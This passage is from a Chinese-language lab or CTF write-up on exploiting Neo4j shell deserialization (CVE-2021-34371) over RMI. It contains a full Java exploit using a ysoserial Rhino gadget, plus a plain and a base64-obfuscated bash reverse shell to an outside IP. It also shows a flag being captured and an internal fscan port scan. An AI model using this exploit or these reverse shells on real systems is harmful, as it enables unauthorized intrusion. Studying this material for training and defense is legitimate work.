+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w"></span><span class="n">To</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="k">this</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">scratch</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">Java</span><span class="p">,</span><span class="w"> </span><span class="n">you</span><span class="err">’</span><span class="n">ll</span><span class="w"> </span><span class="n">need</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">modify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">ysoserial</span><span class="w"> </span><span class="n">library</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">include</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="n">here</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//github.com/mozilla/rhino/issues/520 (an update of the existing rhino gadget) as well as modify the ysoserial POM file to include the correct version of rhino. Rebuild ysoserial and include it on your exploit’s classpath. From there, you can use the ShellServer interface and associated code found in neo4j-shell-3.4.18.jar to make your client aware of the server’s method stubs. Now you should be able to call the setSessionVariable method from your exploit/client via RMI.</span><span class="w">
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="w"></span><span class="n">In</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">exploit</span><span class="p">,</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">ysoserial</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">generate</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">follows</span><span class="p">:</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RhinoGadget</span><span class="p">().</span><span class="na">getObject</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">),</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">then</span><span class="w"> </span><span class="n">call</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">setSessionVariable</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">paramObject</span><span class="w"> </span><span class="n">parameter</span><span class="p">.</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="n">parameters</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">anything</span><span class="p">.</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">cause</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">deserialize</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="n">triggering</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">gadget</span><span class="w"> </span><span class="n">chain</span><span class="p">,</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">running</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">command</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w"></span><span class="n">It</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">worth</span><span class="w"> </span><span class="n">noting</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">chose</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">exploit</span><span class="w"> </span><span class="k">this</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">paramObject</span><span class="w"> </span><span class="n">parameter</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="k">this</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">most</span><span class="w"> </span><span class="n">direct</span><span class="p">,</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">takes</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="nf">Object</span><span class="w"> </span><span class="p">(</span><span class="n">other</span><span class="w"> </span><span class="n">than</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">primitave</span><span class="p">)</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">likely</span><span class="w"> </span><span class="n">vulnerable</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">well</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="w"></span><span class="kn">package</span><span class="w"> </span><span class="nn">runnable</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">payloads.RhinoGadget</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.rmi.registry.RegistryImpl_Stub</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.Serializable</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Naming</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.shell.ShellServer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ExploitB</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">COMMAND</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;bash -i &gt;&amp; /dev/tcp/113.45.175.138/9001 0&gt;&amp;1&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">TARGET</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;rmi://39.99.229.213:1337&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">TARGET_BINDING</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;shell&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">args</span><span class="o">[]</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="w">        </span><span class="kt">boolean</span><span class="w"> </span><span class="n">validBinding</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">checkBinding</span><span class="p">(</span><span class="n">TARGET_BINDING</span><span class="p">,</span><span class="w"> </span><span class="n">TARGET</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">validBinding</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;[-] No valid binding found, shell server may not be listening. Exiting&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">exit</span><span class="p">(</span><span class="n">0</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;[+] Found valid binding, proceeding to exploit&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="w">        </span><span class="n">ShellServer</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ShellServer</span><span class="p">)</span><span class="w"> </span><span class="n">Naming</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="n">TARGET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;/&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">TARGET_BINDING</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RhinoGadget</span><span class="p">().</span><span class="na">getObject</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="w">        </span><span class="c1">//Here server.shutdown may also be callable without auth, just in case the exploit fails and you just want to turn the thing off</span><span class="w">
+</span></span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="w">            </span><span class="n">server</span><span class="p">.</span><span class="na">setSessionVariable</span><span class="p">(</span><span class="n">newClientId</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;anything_here&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">payload</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="w">        </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;[+] Caught an unmarshalled exception, this is expected.&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;[+] Exploit completed&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">55</span><span class="cl"><span class="w">    </span><span class="cm">/**
+</span></span></span><span class="line"><span class="ln">56</span><span class="cl"><span class="cm">     * Just a helper method to validate that the rmi binding we&#39;re looking for is present
+</span></span></span><span class="line"><span class="ln">57</span><span class="cl"><span class="cm">     * @param bindingToCheck the binding you&#39;d like to check for
+</span></span></span><span class="line"><span class="ln">58</span><span class="cl"><span class="cm">     * @param targetToCheck the rmi registry to check against
+</span></span></span><span class="line"><span class="ln">59</span><span class="cl"><span class="cm">     * @return true if the binding is present, false if not
+</span></span></span><span class="line"><span class="ln">60</span><span class="cl"><span class="cm">     */</span><span class="w">
+</span></span></span><span class="line"><span class="ln">61</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">checkBinding</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">bindingToCheck</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">targetToCheck</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="ln">62</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">63</span><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Trying to enumerate server bindings: &#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">64</span><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="ln">65</span><span class="cl"><span class="w">            </span><span class="n">RegistryImpl_Stub</span><span class="w"> </span><span class="n">stub</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RegistryImpl_Stub</span><span class="p">)</span><span class="w"> </span><span class="n">Naming</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="n">targetToCheck</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">66</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">67</span><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">element</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">stub</span><span class="p">.</span><span class="na">list</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="ln">68</span><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Found binding: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">element</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">69</span><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">element</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="n">bindingToCheck</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="ln">70</span><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">71</span><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="ln">72</span><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w">  </span><span class="kc">false</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">73</span><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="ln">74</span><span class="cl"><span class="w">        </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="ln">75</span><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="ln">76</span><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">77</span><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="ln">78</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">79</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="ln">80</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">81</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Serializable</span><span class="w"> </span><span class="nf">newClientId</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="ln">82</span><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">valueOf</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="ln">83</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="ln">84</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">85</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="ln">86</span><span class="cl"><span class="w">            
+</span></span></span></code></pre></div><p>或者直接用</p>
+<p><a href="https://github.com/zwjjustdoit/CVE-2021-34371.jar">zwjjustdoit/CVE-2021-34371.jar: CVE-2021-34371.jar</a></p>
+<p>反弹shell</p>
+<pre tabindex="0"><code>java -jar rhino_gadget.jar rmi://39.99.229.213:1337 &#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTMuNDUuMTc1LjEzOC85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}&#34;
+</code></pre><p><img alt="image-20250408114840146" loading="lazy" src="../assets/image-20250408114840146.png"></p>
+<p>拿到第一个flag</p>
+<pre tabindex="0"><code>neo4j@ubuntu:/$ cat /home/neo4j/f*
+cat /home/neo4j/f*
+ ██████████ ██                    
+░░░░░██░░░ ░░                     
+    ░██     ██ ██████████   █████ 
+    ░██    ░██░░██░░██░░██ ██░░░██
+    ░██    ░██ ░██ ░██ ░██░███████
+    ░██    ░██ ░██ ░██ ░██░██░░░░ 
+    ░██    ░██ ███ ░██ ░██░░██████
+    ░░     ░░ ░░░  ░░  ░░  ░░░░░░ 
+
+
+flag01: flag{cd636779-1376-41a5-a2ca-9adbee764248}
+
+Do you know the authentication process of Kerberos? 
+......This will be the key to your progress.
+</code></pre><h3 id="flag2">FLAG2<a hidden class="anchor" aria-hidden="true" href="#flag2">#</a></h3>
+<p>先信息收集一手</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">neo4j@ubuntu:/tmp$ ip addr
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">1<span class="p">:</span> <span class="nl">lo</span><span class="c1">: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    inet 127.0.0.1/8 scope host lo
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    inet6 ::1/128 scope host 
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">       valid_lft forever preferred_lft forever
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">2<span class="p">:</span> <span class="nl">eth0</span><span class="c1">: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    link/ether 00:16:3e:2f:e7:ab brd ff:ff:ff:ff:ff:ff
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    inet 172.22.6.36/16 brd 172.22.255.255 scope global dynamic eth0
+</span></span><span class="line"><span class="ln">11</span><span class="cl">       valid_lft 315356731sec preferred_lft 315356731sec
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    inet6 fe80::216:3eff:fe2f:e7ab/64 scope link 
+</span></span><span class="line"><span class="ln">13</span><span class="cl">       valid_lft forever preferred_lft forever
+</span></span></code></pre></div><p>fscan扫一下内网</p>
+<pre tabindex="0"><code>fscan -h 172.22.6.0/24 -p 1-65535 -pg -eh 172.22.6.36
+</code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln">  1</span><span class="cl">neo4j@ubuntu:/tmp$ fscan -h 172.22.6.0/24 -p 1-65535 -pg -eh 172.22.6.36
+</span></span><span class="line"><span class="ln">  2</span><span class="cl">┌──────────────────────────────────────────────┐
+</span></span><span class="line"><span class="ln">  3</span><span class="cl">│    ___                              _        │
+</span></span><span class="line"><span class="ln">  4</span><span class="cl">│   / _ \     ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __    │
+</span></span><span class="line"><span class="ln">  5</span><span class="cl">│  / /_\/____/ __<span class="p">|</span>/ __<span class="p">|</span> &#39;__/ _` <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /    │
+</span></span><span class="line"><span class="ln">  6</span><span class="cl">│ / /_\\_____\__ \ (__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">(</span>__<span class="p">|</span>   <span class="p">&lt;</span>     │
+</span></span><span class="line"><span class="ln">  7</span><span class="cl">│ \____/     <span class="p">|</span>___/\___<span class="p">|</span>_<span class="p">|</span>  \__,_<span class="p">|</span>\___<span class="p">|</span>_<span class="p">|</span>\_\    │
+</span></span><span class="line"><span class="ln">  8</span><span class="cl">└──────────────────────────────────────────────┘
+</span></span><span class="line"><span class="ln">  9</span><span class="cl">      Fscan Version: 2.0.0
+</span></span><span class="line"><span class="ln"> 10</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 11</span><span class="cl">[2025-04-08 11:59:45] [INFO] 暴力破解线程数: 1
+</span></span><span class="line"><span class="ln"> 12</span><span class="cl">[2025-04-08 11:59:45] [INFO] 开始信息扫描
+</span></span><span class="line"><span class="ln"> 13</span><span class="cl">[2025-04-08 11:59:45] [INFO] CIDR范围: 172.22.6.0-172.22.6.255
+</span></span><span class="line"><span class="ln"> 14</span><span class="cl">[2025-04-08 11:59:45] [INFO] 生成IP范围: 172.22.6.0.<span class="nv">%!d(string=172.22.6.255) - %!s(MISSING).%!</span>d(MISSING<span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 15</span><span class="cl">[2025-04-08 11:59:45] [INFO] 解析CIDR 172.22.6.0/24 -<span class="p">&gt;</span> IP范围 172.22.6.0-172.22.6.255
+</span></span><span class="line"><span class="ln"> 16</span><span class="cl">[2025-04-08 11:59:45] [INFO] 已排除指定主机: 1 个
+</span></span><span class="line"><span class="ln"> 17</span><span class="cl">[2025-04-08 11:59:45] [INFO] 最终有效主机数量: 255
+</span></span><span class="line"><span class="ln"> 18</span><span class="cl">[2025-04-08 11:59:45] [INFO] 开始主机扫描
+</span></span><span class="line"><span class="ln"> 19</span><span class="cl">[2025-04-08 11:59:45] [INFO] 正在尝试无监听ICMP探测...
+</span></span><span class="line"><span class="ln"> 20</span><span class="cl">[2025-04-08 11:59:45] [INFO] 当前用户权限不足,无法发送ICMP包
+</span></span><span class="line"><span class="ln"> 21</span><span class="cl">[2025-04-08 11:59:45] [INFO] 切换为PING方式探测...
+</span></span><span class="line"><span class="ln"> 22</span><span class="cl">[2025-04-08 11:59:45] [SUCCESS] 目标 172.22.6.12     存活 (ICMP<span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 23</span><span class="cl">[2025-04-08 11:59:48] [SUCCESS] 目标 172.22.6.25     存活 (ICMP)
+</span></span><span class="line"><span class="ln"> 24</span><span class="cl">[2025-04-08 11:59:48] [SUCCESS] 目标 172.22.6.38     存活 (ICMP)
+</span></span><span class="line"><span class="ln"> 25</span><span class="cl">[2025-04-08 11:59:51] [INFO] 存活主机数量: 3
+</span></span><span class="line"><span class="ln"> 26</span><span class="cl">[2025-04-08 11:59:51] [INFO] 有效端口数量: 65535
+</span></span><span class="line"><span class="ln"> 27</span><span class="cl">[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.38:22
+</span></span><span class="line"><span class="ln"> 28</span><span class="cl">[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:53
+</span></span><span class="line"><span class="ln"> 29</span><span class="cl">[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.38:80
+</span></span><span class="line"><span class="ln"> 30</span><span class="cl">[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:88
+</span></span><span class="line"><span class="ln"> 31</span><span class="cl">[2025-04-08 11:59:51] [SUCCESS] 服务识别 172.22.6.38:22 =<span class="p">&gt;</span> [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]
+</span></span><span class="line"><span class="ln"> 32</span><span class="cl">[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:135
+</span></span><span class="line"><span class="ln"> 33</span><span class="cl">[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.12:139
+</span></span><span class="line"><span class="ln"> 34</span><span class="cl">[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.25:139
+</span></span><span class="line"><span class="ln"> 35</span><span class="cl">[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.25:135
+</span></span><span class="line"><span class="ln"> 36</span><span class="cl">[2025-04-08 11:59:55] [SUCCESS] 端口开放 172.22.6.12:389
+</span></span><span class="line"><span class="ln"> 37</span><span class="cl">[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.12:445
+</span></span><span class="line"><span class="ln"> 38</span><span class="cl">[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.25:445
+</span></span><span class="line"><span class="ln"> 39</span><span class="cl">[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.12:464
+</span></span><span class="line"><span class="ln"> 40</span><span class="cl">[2025-04-08 11:59:56] [SUCCESS] 服务识别 172.22.6.12:88 =&gt; 
+</span></span><span class="line"><span class="ln"> 41</span><span class="cl">[2025-04-08 11:59:56] [SUCCESS] 服务识别 172.22.6.38:80 =<span class="p">&gt;</span> [http]
+</span></span><span class="line"><span class="ln"> 42</span><span class="cl">[2025-04-08 11:59:57] [SUCCESS] 端口开放 172.22.6.12:593
+</span></span><span class="line"><span class="ln"> 43</span><span class="cl">[2025-04-08 11:59:57] [SUCCESS] 端口开放 172.22.6.12:636
+</span></span><span class="line"><span class="ln"> 44</span><span class="cl">[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:593 =<span class="p">&gt;</span> [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0]
+</span></span><span class="line"><span class="ln"> 45</span><span class="cl">[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:636 =&gt; 
+</span></span><span class="line"><span class="ln"> 46</span><span class="cl">[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:139 =<span class="p">&gt;</span>  Banner:[.]
+</span></span><span class="line"><span class="ln"> 47</span><span class="cl">[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.25:139 =<span class="p">&gt;</span>  Banner:[.]
+</span></span><span class="line"><span class="ln"> 48</span><span class="cl">[2025-04-08 11:59:58] [SUCCESS] 端口开放 172.22.6.12:3268
+</span></span><span class="line"><span class="ln"> 49</span><span class="cl">[2025-04-08 11:59:58] [SUCCESS] 端口开放 172.22.6.12:3269
+</span></span><span class="line"><span class="ln"> 50</span><span class="cl">[2025-04-08 11:59:58] [SUCCESS] 服务识别 172.22.6.12:3269 =&gt; 
+</span></span><span class="line"><span class="ln"> 51</span><span class="cl">[2025-04-08 11:59:59] [SUCCESS] 端口开放 172.22.6.12:3389
